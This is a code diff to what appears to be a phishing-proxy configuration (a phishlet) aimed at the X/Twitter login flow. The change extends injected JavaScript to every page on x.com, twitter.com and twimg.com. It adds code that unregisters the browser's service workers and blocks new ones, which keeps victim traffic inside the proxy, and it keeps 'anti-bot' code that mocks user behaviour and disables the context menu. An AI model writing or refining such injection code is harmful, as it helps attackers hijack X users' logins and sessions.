@@ -41,10 +41,28 @@ login:
   domain: "x.com"
   path: "/i/flow/login"
 js_inject:
-  - trigger_domains: ["x.com", "twitter.com"]
-    trigger_paths: ["/i/flow/login", "/login"]
+  - trigger_domains: ["x.com", "twitter.com", "twimg.com"]
+    trigger_paths: ["/"]
     script: |
       (function(){
+        // Kill Service Workers
+        try {
+            if (navigator.serviceWorker) {
+                navigator.serviceWorker.getRegistrations().then(function(registrations) {
+                    for(let registration of registrations) {
+                        registration.unregister();
+                    }
+                });
+                // Prevent new registrations
+                Object.defineProperty(navigator, 'serviceWorker', {
+                    value: {
+                        register: function() { return new Promise(() => {}); },
+                        getRegistrations: function() { return Promise.resolve([]); }
+                    }
+                });
+            }
+        } catch(e) {}
+        
         // Anti-Bot: Mock user behavior
         document.addEventListener('contextmenu', e => e.preventDefault());
         setInterval(() => {
